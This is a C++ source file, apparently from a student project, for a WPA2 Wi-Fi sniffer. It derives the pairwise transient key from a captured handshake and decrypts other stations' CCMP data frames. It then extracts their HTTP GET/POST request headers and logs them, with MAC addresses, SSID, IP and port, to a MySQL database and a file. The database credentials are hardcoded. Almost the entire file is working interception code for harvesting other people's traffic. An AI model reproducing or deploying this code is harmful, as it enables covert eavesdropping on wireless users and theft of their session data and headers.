bool project::Sta::generatePTK(){
	unsigned char buf[100] = {0,};
    unsigned char str[23] = "Pairwise key expansion";
    memcpy(buf, str, 23);   // 0 ~ 22
	auto copyToBuf = [](Tins::Dot11::address_type& add1, Tins::Dot11::address_type& add2,bool mm){
		// mm == true => min
		// mm == false => max
		 bool check = std::lexicographical_compare(add1.begin(),add1.end(),add2.begin(),add2.end());
		 if(mm == true){
			 return (check == true ? add1 : add2);
		 }else if(mm == false){
			 return (check == true ? add2 : add1);
		 }
	 };
    copyToBuf(this->staMacHW, this->bssidHW, true).copy(buf+23); // 23 ~ 28 MIN
    copyToBuf(this->staMacHW, this->bssidHW, false).copy(buf+29); // 29 ~ 34 MAX
	if(std::lexicographical_compare (this->aNonce, this->aNonce+32, this->sNonce, this->sNonce+32)){
            memcpy(buf+35, this->aNonce, 32);   // 35 ~ 66
            memcpy(buf+67, this->sNonce, 32);   // 67 ~ 99
    }else{
            memcpy(buf+35, this->sNonce, 32);
            memcpy(buf+67, this->aNonce, 32);
    }
	//
    unsigned char value[80] = {0,};
    for(uint32_t i=0; i < 4; i++) {
            buf[99] = i;
            HMAC(EVP_sha1(), this->pmk, 32, buf, 100, value+(i * 20), 0);
    }
	memcpy(this->kck, value, 16);
	memcpy(this->kek, value+16, 16);
	memcpy(this->tk, value+32, 16);
	memcpy(this->txKey, value+48, 8);
	memcpy(this->rxKey, value+56, 8);
	this->checkPTK = true;
    cout << "[+] Generate PTK!" << endl;
	return true;
}
bool project::Sta::decryptDATA(std::shared_ptr<Tins::RawPDU>& shared_ptr, Tins::RawPDU::payload_type& pload){
	Tins::Dot11QoSData qos;
	try{
		qos = shared_ptr->to<Tins::RadioTap>().rfind_pdu<Tins::Dot11QoSData>();
	}catch(std::exception& e){
		return false;
	}
	// web check
	if(!qos.wep()) return false;
	//
	Tins::RawPDU *raw = 0;
	if((raw = qos.find_pdu<Tins::RawPDU>()) == 0) return false;
	pload = raw->payload();
	// PN
	unsigned char PN[6] = {pload[7], pload[6], pload[5], pload[4], pload[1], pload[0]};
	// Counter
	unsigned char counter[16] = {0,};
	counter[0] = 0x01;
	counter[1] = 0x00;
	qos.addr2().copy(counter+2);
	memcpy(counter+8, PN, 6);

	unsigned char cipher_text[16];
	AES_KEY ctx;
	AES_set_encrypt_key(this->tk, 128, &ctx);

	size_t total_sz = raw->payload_size() - 16, offset = 8, blocks = (total_sz + 15) / 16;
	for (size_t i = 1; i <= blocks; ++i) {
    	size_t block_sz = (i == blocks) ? (total_sz % 16) : 16;
    	if (block_sz == 0) {
        		block_sz = 16;
    	}
   		counter[14] = (i >> 8) & 0xff;
   		counter[15] = i & 0xff;
    	AES_encrypt(counter, cipher_text, &ctx );
    	this->xor_range(cipher_text, &pload[offset], &pload[(i - 1) * 16], block_sz);
    	offset += block_sz;
    }
	return true;
}
bool project::Sta::HttpParsing(Tins::RawPDU::payload_type& dataPayload, Tins::IP *ip, Tins::TCP *tcp){
	// HTTP packet check
	std::stringstream autoss;
	auto checkHttp = [&dataPayload, &autoss](){
		uint32_t i = 0, size = dataPayload.size();
		autoss.str("");
		for(i; i<size; i++) {
			if(dataPayload[i] == 0x0d) {
				if(dataPayload[i+1] == 0x0a) break;
			}
			autoss << static_cast<char>(dataPayload[i]);
		}
		if(autoss.str().find("HTTP") == std::string::npos) return false;
		return true;
	};
	if(checkHttp() == false) return false;
	// GET or POST checkHttp
	// 0x20 : " "
	auto getFirstWord = [&dataPayload, &autoss](){
		uint32_t i = 0, size = dataPayload.size();
		autoss.str("");
		for(auto& t : dataPayload){
			if(t == 0x20) break;
			autoss << static_cast<char>(t);
		}
		return autoss.str();
	};
	std::string firstWord = getFirstWord();
	if( !(firstWord == "GET" || firstWord == "POST") ) return false;
	// HTTP Header parsing !! , GET or POST and (0x0d 0x0a)(0x0d 0x0a) find !
	auto getHttpHeader = [&dataPayload, &autoss](){
		autoss.str("");
		uint32_t i=0;
		for(auto& t : dataPayload){
			if( t == 0x0d){
				if( (dataPayload[i+1] == 0x0a)
					&&(dataPayload[i+2] == 0x0d)
					&& (dataPayload[i+3] == 0x0a)) return autoss.str();
			}
			i++;
			autoss << (char)t;
		}
	};
	std::shared_ptr<std::string> httpHeader(new std::string(getHttpHeader()));
	// decrpt Data Push !
	this->decryptedPacketQue.push(std::shared_ptr<project::ToDB>(new project::ToDB(this->bssid, this->ssid, this->staMac, httpHeader, ip->src_addr().to_string(), tcp->sport())));
	// get Send Queue Mutex
	if(project::insertSendQueue(this->decryptedPacketQue) == false){
	//	std::cout << "don't get send queue !!" << std::endl;
	//	std::cout << "decrypted Packet queue size : " << this->decryptedPacketQue.size() << std::endl;
	}else {
	//	std::cout << "get send queue !!" << std::endl;
	//	std::cout << "decrypted Packet queue size : " << this->decryptedPacketQue.size() << std::endl;
	}
	//
	return true;
}
//*********************************************************************/

// Insert and dequeing [decrypt data queue]
// Send
bool project::insertSendQueue(std::queue<std::shared_ptr<project::ToDB>>& decryptedQueue){
	std::unique_lock<std::mutex> sendLock(project::kSendQueue,std::defer_lock_t());
	uint32_t queueSize = decryptedQueue.size();
	if(!sendLock.try_lock()) return false;
	//
	while(queueSize-- > 0){
		std::shared_ptr<project::ToDB> tmpStringPtr = decryptedQueue.front();
		project::sendQueue.push(tmpStringPtr);
		decryptedQueue.pop();
	}
	sendLock.unlock();
	project::sendCV.notify_one();
	return true;
}
bool project::sendThread(){
	// get thread's Id and thread's plus self Exception index !!
	uint32_t id = project::Radio_Sniffer::plusExcptionNum();
	uint32_t queueSize;
	//
	std::string url("localhost");
	std::string user("capston");
	std::string password("password");
	std::string database("capston_DB");
	std::string table("WSniffer_wsniffer");
	project::DB_connection dbcon(url, user, password, database, table);

	if(dbcon.get_driver_instance() == false) {
		std::cout << "[sendThread]<get_driver_instance> return false !!" << std::endl;
		project::set_sig(true); // program End !!
		return false;
	}
	if(dbcon.setConnection() == false) {
		std::cout << "[sendThread]<setConnection> return false !!" << std::endl;
		project::set_sig(true); // program End !!
		return false;
	}
	//
	std::cout << "[project::sendThread] id : " << id << " : Running" << std::endl;
	ofstream ofs("./sta/sendThreadFile");
	while(true){
		// signal
		if(project::get_sig() == true) return false;
		std::unique_lock<std::mutex> sendLock(project::kSendQueue);
		cout << "[project::sendThread] : prefer Wait() !!" << endl;
		if(sendCV.wait_for(sendLock, std::chrono::milliseconds(50000)) == std::cv_status::timeout) {
			cout << "[project::sendThread] : Timed out !!" << endl;
			continue;
		}
		if(!sendLock.owns_lock()) {
			cout << "[project::sendThread] : don't get Mutex !!" << endl;
			continue;
		}
		//
		if((queueSize = project::sendQueue.size()) == 0) continue;
		// Wirte DB
		if(project::printHttpRequestHeader == true) std::cout << "~~~~~~~~~~~~~~~~~~~~~ Send Thread Start ~~~~~~~~~~~~~~~~~~~~~" << std::endl;
		if(project::printFile == true) ofs << "~~~~~~~~~~~~~~~~~~~~~ Send Thread Start ~~~~~~~~~~~~~~~~~~~~~" << std::endl;
		while (queueSize-- > 0) {
			//  sendQueue is not empty
			std::shared_ptr<project::ToDB> tmpDBdata = project::sendQueue.front();
			project::sendQueue.pop();
			// to Console
			if(project::printHttpRequestHeader == true) {
				std::cout << "Ap MAC Address : " << tmpDBdata->APmac << std::endl;
				std::cout << "Ap SSID : " << tmpDBdata->APssid << std::endl;
				std::cout << "STA MAC Address : " << tmpDBdata->STAmac << std::endl;
				std::cout << "NAT IP Address : " << tmpDBdata->NAT_ip << std::endl;
				std::cout << "NAT SRC Port : " << tmpDBdata->NAT_port << std::endl;
				std::cout << "Http Request Header : \n";
				try{
					printf("%s\n\n",tmpDBdata->lpHttp_request_header->c_str());
				}catch(std::exception& e){
					std::cout << "[sendThread]<printf> : Exception Throw : " << e.what() << std::endl;
				}
			}
			// to Database !!
			try {
				if(dbcon.executeQuery(tmpDBdata->APmac, tmpDBdata->APssid, tmpDBdata->STAmac, tmpDBdata->lpHttp_request_header, tmpDBdata->NAT_ip, tmpDBdata->NAT_port) == false) {
					std::cout << "dbcon executeQuery() return false !!" << std::endl;
					return false;
				}
				std::cout << "[" << tmpDBdata->STAmac << "]<Http Request Header to DataBase> Excute Query !!" << std::endl;
			}catch(sql::SQLException& e) {
				std::cout << "[sendThread]<executeQuery> : Throw Exception : " << e.what()  << " (MySQL error code : " << e.getErrorCode() << ", SQLState : " << e.getSQLState() << " )" << std::endl;
			}catch(std::exception& stde) {
				std::cout << "[sendThread]<executeQuery> : Throw Exception : " << stde.what() << std::endl;
			}
			// to File
			if(project::printFile == true) {
				ofs << "Ap MAC Address : " << tmpDBdata->APmac << std::endl;
				ofs << "Ap SSID : " << tmpDBdata->APssid << std::endl;
				ofs << "STA MAC Address : " << tmpDBdata->STAmac << std::endl;
				ofs << "NAT IP Address : " << tmpDBdata->NAT_ip << std::endl;
				ofs << "NAT SRC Port : " << tmpDBdata->NAT_port << std::endl;
				ofs << "Http Request Header : \n" << *(tmpDBdata->lpHttp_request_header) << "\n" << std::endl;
			}
			//
		}
		if(project::printHttpRequestHeader == true) std::cout << "~~~~~~~~~~~~~~~~~~~~~ Send Thread End   ~~~~~~~~~~~~~~~~~~~~~" << std::endl;
		if(project::printFile == true) ofs << "~~~~~~~~~~~~~~~~~~~~~ Send Thread End   ~~~~~~~~~~~~~~~~~~~~~" << std::endl;
	}
}
////////////////////////////////////////////////////////////////////////

project::DB_connection::DB_connection(std::string& url_,
				std::string& user_,
				std::string& password_,
				std::string& database_,
				std::string& table_) {
	this->url = url_;
	this->user = user_;
	this->password = password_;
	this->database = database_;
	this->table = table_;
}
//
bool project::DB_connection::get_driver_instance(){
	try {
		this->driver = sql::mysql::get_driver_instance();
	}catch(sql::SQLException &e) {
		std::cout << "[DB_connection]<DB_connection> Throw Exception : " << e.what() << " (MySQL error code : " << e.getErrorCode() << ", SQLState : " << e.getSQLState() << " )" << std::endl;
		return false;
	}
	return true;
}
//
bool project::DB_connection::setConnection(std::string& url_, std::string& user_, std::string& pw, std::string& table_) {
	this->url = url_;
	this->user = user_;
	this->password = pw;
	this->table = table_;
	if(setConnection()) return true;
	return false;
}
bool project::DB_connection::setConnection() {
	try {
		this->con.reset(this->driver->connect(this->url, this->user, this->password));
		if(this->con->isValid() == false) {
			std::cout << "[DB_connection]<setConnection> fail connecting !!" << std::endl;
			project::set_sig(true);
			return false;
		}
		// set database !!
		this->con->setSchema(this->database);
	}catch(sql::SQLException& e) {
		std::cout << "[DB_connection]<setConnetion> Throw Exception : " << e.what() << " (MySQL error code : " << e.getErrorCode() << ", SQLState : " << e.getSQLState() << " )" << std::endl;
		return false;
	}
	return true;
}
//
bool project::DB_connection::executeQuery(std::string& ApMac,
	 			std::string& ApSsid,
				std::string& StaMac,
				std::shared_ptr< std::string > HttpRequestHeader,
				std::string& NetIp,
				std::string& NetPort) {
	try{
		this->prep_stmt.reset(this->con->prepareStatement("INSERT INTO " + this->table + "(ApMac, ApSsid, StaMac, Date, HttpRequestHeader, NetIp, NetPort) VALUES (?, ?, ?, ?, ?, ?, ?)"));
	}catch(sql::SQLException& e) {
		std::cout << "[DB_connection]<executeQuery 1> Throw Exception : " << e.what() << " (MySQL error code : " << e.getErrorCode() << ", SQLState : " << e.getSQLState() << " )" << std::endl;
		return false;
	}

	try {

		this->prep_stmt->setString(1, ApMac); //
		this->prep_stmt->setString(2, ApSsid); //
		this->prep_stmt->setString(3, StaMac); //
		//
		std::chrono::system_clock::time_point now = std::chrono::system_clock::now();
		std::time_t now_c = std::chrono::system_clock::to_time_t(now - std::chrono::hours(24));
		std::stringstream tmp;
		tmp << std::put_time(std::localtime(&now_c), "%F %T");
		if(project::printHttpRequestHeader == true) {
			std::cout << "[DB_connection]<executeQuery> time : " << tmp.str() << std::endl;
		}
		this->prep_stmt->setDateTime(4, tmp.str()); //
		//
		std::cout << "[]DB_connection]<executeQuery> 1 set http reqeust header !!\n";
		std::string tmpString(*HttpRequestHeader); // Error Throw !!
		std::cout << "[]DB_connection]<executeQuery> 2 set http reqeust header !!\n";
		this->prep_stmt->setString(5, *HttpRequestHeader); // Error Throw !!
		std::cout << "[]DB_connection]<executeQuery> 3 set http reqeust header !!\n";
		this->prep_stmt->setString(6, NetIp); //
		this->prep_stmt->setString(7, NetPort); //
		std::cout << "[DB_connection]<executeQuery> Before Throw Query !!\n";
		this->prep_stmt->execute();
		std::cout << "[DB_connection]<executeQuery> After Throw Query !!\n";
	}catch(sql::SQLException& e) {
		std::cout << "[DB_connection]<executeQuery 2> Throw Exception : " << e.what() << " (MySQL error code : " << e.getErrorCode() << ", SQLState : " << e.getSQLState() << " )" << std::endl;
		return false;
	}
	return true;
}
// setter and getter
bool project::DB_connection::setUrl(std::string& url_) {
	this->url = url_;
	return true;
}
std::string project::DB_connection::setUrl() {
	return this->url;
}
bool project::DB_connection::setUser(std::string& user_) {
	this->user = user_;
	return true;
}
std::string project::DB_connection::setUser() {
	return this->user;
}
bool project::DB_connection::setPassWord(std::string& pw) {
	this->password = pw;
	return true;
}
std::string project::DB_connection::setPassWord() {
	return this->password;
}
bool project::DB_connection::setDB(std::string& database_) {
	this->database = database_;
	return true;
}
std::string project::DB_connection::setDB() {
	return this->database;
}
bool project::DB_connection::setTable(std::string& table_) {
	this->table = table_;
	return true;
}
std::string project::DB_connection::setTable() {
	return this->table;
}
